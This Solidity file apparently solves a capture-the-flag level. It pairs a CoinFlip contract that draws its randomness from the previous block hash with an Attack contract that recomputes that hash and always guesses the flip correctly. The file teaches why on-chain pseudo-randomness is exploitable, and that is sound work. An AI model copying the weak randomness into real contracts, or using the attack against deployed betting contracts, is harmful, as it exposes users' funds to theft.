// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

contract Attack {

    CoinFlip internal coinFlip;

    uint256 public lastHash;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlip) {
        coinFlip = _coinFlip;
    }

    // check if the current block has changed
    function canAttack() public view returns(bool) {
        return lastHash != uint256(blockhash(block.number - 1));
    }

    // convenience function
    function getConsecutiveWins() external view returns(uint256) {
        return coinFlip.consecutiveWins();
    }

    // call 10 times in a row (keep some delay to include every call to different blocks)
    function attack() external {
        require(canAttack(), "cannot attack yet!");
        uint256 blockValue = uint256(blockhash(block.number - 1));
        lastHash = blockValue;
        coinFlip.flip((blockValue / FACTOR) == 1);
    }

}